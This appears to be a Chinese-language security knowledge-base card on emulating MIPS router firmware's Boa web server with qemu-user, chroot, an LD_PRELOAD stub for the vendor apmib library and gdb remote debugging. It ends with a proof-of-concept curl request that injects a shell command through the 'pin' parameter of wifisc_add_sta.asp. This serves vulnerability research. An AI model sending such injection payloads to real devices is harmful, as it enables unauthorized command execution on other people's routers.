---
id: code-analysis-reverse-firmware-qemu-user-mips-ldpreload-gdb
title: QEMU user-mode MIPS 固件仿真：LD_PRELOAD 伪造 apmib 依赖 + gdb 远程调试
type: scenario
domain: code-analysis
path: code-analysis/reverse/firmware
technique: qemu-user-mips-chroot-ldpreload-fake-apmib-gdb
tags:
- firmware
- reverse
- qemu
- mips
- ldpreload
- gdb
- iot
- emulation
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V128
  verified_at: '2026-11-06T04:09:38+08:00'
  notes: 已对照原文与20张图核对：file bin/boa 为 ELF 32-bit MSB MIPS-I、/lib/apmib.so 的 apmib_init/apmib_get、mips-linux-gnu-gcc -fPIC -shared 生成 LD_PRELOAD 库、chroot+qemu-mips-static 运行、-g 1234 + gdb-multiarch target remote、b *0x45ab80、first.asp 跳转修正、var/run 与 var/tmp 前置文件均与原文/图03-19一致；原文 apmib.c 的 "*v = 1;s" 笔误在卡中修正为 "*v = 1;"。未验证点：未在本机复跑仿真；IDA 远程调试与 gdb 两条路径原文均用到。
url: /docs/code-analysis/reverse/firmware/code-analysis-reverse-firmware-qemu-user-mips-ldpreload-gdb/
draft: false
kb_aliases:
- qemu-mips-static
- chroot 固件仿真
- LD_PRELOAD
- apmib_init
- apmib_get
- gdb-multiarch
- DIR-605L 仿真
---

## 一句话结论

对 MIPS 大端固件中的 Boa，可用 `qemu-mips-static` + `chroot` 直接运行；启动时 `apmib_init()` 失败会退出，用 `mips-linux-gnu-gcc` 编译一个 `LD_PRELOAD` 的 `apmib-ld.so` 伪造 `apmib_init`/`apmib_get`/`fork`，再配合 `gdb-multiarch` 通过 `qemu -g 1234` 远程调试，即可在断点观察 `system` 参数并复现命令注入。

## 原理

- **架构识别**：`file bin/boa` 显示 `ELF 32-bit MSB executable, MIPS, MIPS-I, dynamically linked, interpreter /lib/ld-uClibc.so.0, no section header`；需要 `qemu-mips-static`（大端 MIPS user-mode）运行。
- **chroot 仿真**：把固件 squashfs-root 作为根目录，`sudo chroot ./ ./qemu-mips-static ./bin/boa`；缺少 `/proc`、`/dev`、NVRAM 等依赖时，Boa 可能在初始化阶段报错/崩溃。
- **`apmib_init` 依赖**：Boa 启动时 `if (!apmib_init()) return puts("Initialize AP MIB failed!")`；`apmib_init` 在 `/lib/apmib.so` 中，负责从 Flash 读取 MIB 配置。仿真环境没有真实 Flash/NVRAM，直接运行会失败。
- **LD_PRELOAD 伪造**：写一个同名 `apmib_init()` 返回 1；再实现 `apmib_get(int code, void *value)`，对 `MIB_IP_ADDR`(170)、`MIB_HW_VER`(0x250)、`MIB_CAPTCHA`(0x2C1)、`MIB_WPS_MODE`(0x3B) 等返回合理值；`fork()` 返回 0 防止 Boa 初始化 fork 失败。用 `mips-linux-gnu-gcc -fPIC -shared` 编译成 `apmib-ld.so`，`qemu-mips-static -E LD_PRELOAD=/apmib-ld.so` 加载。
- **gdb 远程调试**：`qemu-mips-static -g 1234` 在 1234 端口等待 gdb；`gdb-multiarch ./bin/boa` → `set architecture mips` → `target remote :1234`；在 `system` 调用前下断点（如 `b *0x45ab80`），`c` 继续，触发请求后查看 `$a0` 即 `system` 参数。
- **Web 跳转修正**：仿真后首页可能跳 `Basic/Wizard_Easy_LangSelect.asp` 导致 404；修改 `web/first.asp`，注释该跳转、把 `Wizard_Easy_Welcome.asp` 放到 else 分支，即可访问登录页/目标接口。
- **前置文件**：`start_wps` 等逻辑会检查 `/var/run/wscd-wlan0.pid`、`/var/tmp/wscd_status`；仿真时 `mkdir -p` + `touch` 创建。
- **为什么可行**：qemu-user 直接执行 MIPS 指令，LD_PRELOAD 在用户态替换缺失的厂商库函数，gdb 远程调试提供寄存器/内存/断点观测；不需要完整 MIPS 内核或真实硬件。

## 触发条件

- 固件已解包，目标二进制为 MIPS 大端/小端（按 `file` 选择 qemu）。
- 有 `qemu-mips-static`、`mips-linux-gnu-gcc`、`gdb-multiarch`（或 IDA remote debug）。
- 目标服务依赖厂商库（如 `apmib.so`、NVRAM、Flash），在 chroot 中缺失。
- 目标未被加壳/强反调试，或可绕过。
- 需要动态观察的参数/分支可通过断点或日志定位。

## 利用步骤

1. `binwalk -Me firmware.bin` 解包，`file bin/boa` 确认架构；复制 `qemu-mips-static` 到 squashfs-root。
2. 直接 `chroot` 运行，记录初始化错误（如 `Initialize AP MIB failed!`）；在 IDA 中定位错误字符串与 `apmib_init` 调用。
3. 在 `lib/apmib.so` 中分析 `apmib_init`/`apmib_get` 的参数与配置项编号；编写 `apmib.c` 伪造返回值。
4. `mips-linux-gnu-gcc ./apmib.c -o apmib-ld.so -fPIC -shared` 编译；`sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD="/apmib-ld.so" ./bin/boa` 运行。
5. 若崩溃，用 `-g 1234` + `gdb-multiarch` 远程调试，定位崩溃指令（如 `apmib_get` 跳转），补充 `apmib_get` 的 case/返回。
6. 修正 `web/first.asp` 跳转、创建 `/var/run`、`/var/tmp` 前置文件；访问目标页面确认服务可用。
7. 在 `system` 调用前下断点，发送 PoC 请求，查看寄存器/栈中的命令参数，确认命令注入。

## PoC

```c
// apmib.c：伪造厂商库依赖
#include <stdio.h>
#include <stdlib.h>
#define MIB_IP_ADDR  170
#define MIB_HW_VER   0x250
#define MIB_CAPTCHA  0x2C1
#define MIB_WPS_MODE 0x3B

int apmib_init(void) { return 1; }
int fork(void) { return 0; }   // 防止 boa 初始化 fork 失败
int apmib_get(int code, void *value) {
    int *v = (int *)value;
    switch (code) {
        case MIB_IP_ADDR:  *v = 0x7F000001; break; // 127.0.0.1
        case MIB_HW_VER:   *v = 0xF1; break;
        case MIB_CAPTCHA:  *v = 1; break;
        case MIB_WPS_MODE: *v = 0; break;          // 进入 start_wps 的 system 分支
        default:           *v = 0; break;
    }
    return 1;
}
```

```bash
# 编译并运行
mips-linux-gnu-gcc ./apmib.c -o apmib-ld.so -fPIC -shared
sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD="/apmib-ld.so" ./bin/boa

# gdb 远程调试
sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=/apmib-ld.so -g 1234 ./bin/boa
gdb-multiarch ./bin/boa
(gdb) set architecture mips
(gdb) target remote :1234
(gdb) b *0x45ab80        # system 调用前
(gdb) c
```

```bash
# 触发请求（保留分号）
curl --path-as-is 'http://127.0.0.1/Basic/wifisc_add_sta.asp?pin=12345678;echo>/var/run/cnvd_test'
# gdb 中断后：x/s $a0  -> "iwpriv wlan0 set_mib pin=12345678;echo>/var/run/cnvd_test"
```

## 变体与关联

- 仿真方式变体：`qemu-user` + chroot 适合单服务；依赖内核 IPC/消息总线/网卡的服务需 `qemu-system` 完整 VM，见 [[code-analysis-reverse-firmware-huawei-squashfs-mips-emulation]]。
- 依赖伪造变体：LD_PRELOAD 可伪造 `nvram_get`、`apmib_get`、`fork`、`system`、`ioctl` 等；也可用 `qemu -strace`/`-d` 观察系统调用。
- 调试变体：gdb-multiarch、IDA remote GDB、`qemu -g` + `target remote`；断点可下在 `system`、`sprintf`、目标函数入口。
- 关联：[[iot-firmware-boa-pin-command-injection]]（本文复现的漏洞）、[[code-analysis-reverse-firmware-custom-package-aes-kdf-field-recovery]]（固件解包/算法恢复）。

## 检测与防御

- 检测：固件中存在调试符号/字符串、未剥离的厂商库、默认开启的 telnet/Web 管理；仿真时 `LD_PRELOAD` 加载异常库；设备上出现非预期进程/文件。
- 防御：固件发布剥离符号、关闭调试接口；对关键库做完整性校验；Web 管理接口鉴权与输入过滤；安全启动/固件签名。
- 加固：最小化服务与权限；禁止 `LD_PRELOAD`/`ptrace` 滥用（生产环境）；及时更新固件修复命令注入。
